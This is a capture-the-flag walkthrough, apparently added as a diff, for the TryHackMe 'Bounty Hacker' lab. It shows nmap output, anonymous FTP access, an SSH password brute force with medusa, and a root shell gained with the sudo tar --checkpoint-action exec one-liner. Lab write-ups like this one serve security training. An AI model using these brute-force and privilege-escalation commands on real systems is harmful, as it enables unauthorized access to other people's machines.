@@ -1,0 +1,101 @@
+Room Name:
+  Bounty Hacker
+  https://tryhackme.com/room/cowboyhacker
+ 
+Objective:
+  Find the user password, obtain the flags and root the machine
+  
+Difficulty:
+  Easy
+  
+#Enumeration
+  As always, it's start with nmap 
+
+  └──╼ $nmap -sC -sV -A bounty.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 07:09 CDT
+Nmap scan report for bounty.thm (10.10.54.3)
+Host is up (0.20s latency).
+Not shown: 968 filtered ports, 29 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.26.60
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.92 seconds
+
+# ftp
+  Randomly logged in as anonymous.
+  
+  └──╼ $ftp bounty.thm
+Connected to bounty.thm.
+220 (vsFTPd 3.0.3)
+Name (bounty.thm:ashh): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -al
+
+Here, we found two text files.
+
+-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
+
+  *task.txt ( may be hint )
+  
+#Brute-Force
+  Here it played well,..lol .I tried creating custom wordlist with username as show in crew picture but it doesn't seems to work and then i figured out task file with as name called as lin.
+  Again lol.. hydra was not working fine ( may be update reason )
+  so, i tried medusa and metasploit.
+  
+  └──╼ $medusa -U lin -P locks.txt -h 10.10.54.3 -M ssh
+    ACCOUNT FOUND: [ssh] Host: 10.10.54.3 User: lin Password: R***************3 [SUCCESS]
+  
+  Atlast, i got the combination. 
+  
+#ssh
+  
+  └──╼ $ssh lin@10.10.54.3
+  lin@bountyhacker:~/Desktop$ ls -al
+    #user.txt
+      cat user.txt
+      THM{C**********3}
+      
+     #root.txt
+      first, tried with sudo -l
+      User lin may run the following commands on bountyhacker:
+      (root) /bin/tar
+      It seems we can with lin as with sudo privilage.
+      
+        *sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+        tar: Removing leading `/' from member names
+          # id
+          uid=0(root) gid=0(root) groups=0(root)
+          # cat /root/root.txt
+          THM{8*********r}
+          
+#credits
+  Thanks for making this room "Sevuhl" and it was fun.
+  Thankyou for reading.
+
+  
